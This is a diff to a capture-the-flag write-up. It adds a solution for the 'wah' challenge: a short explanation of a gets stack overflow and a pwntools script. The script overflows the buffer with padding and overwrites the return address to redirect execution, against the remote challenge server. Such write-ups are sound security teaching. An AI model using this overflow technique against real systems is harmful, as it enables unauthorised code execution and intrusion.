@@ -10,7 +10,25 @@ Baby friendly!
 
 #### Solution:
 
-```bash
+Classic `gets` stack overflow with return address overwrite, basically same as `tranquil` from `angstromctf 2021`.
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+from struct import *
+
+r = remote('challs.actf.co', 31224)
+# r = process('./wah')
+
+payload = b'A'*(32) + b'B'*8 + pack("<Q", 0x0000000000401236)
+
+print(r.recvuntil("Cry:").decode('utf-8').strip())
+
+r.sendline(payload)
+
+print(r.recvline().decode('utf-8').strip())
+r.close()
 ```
 
 ---
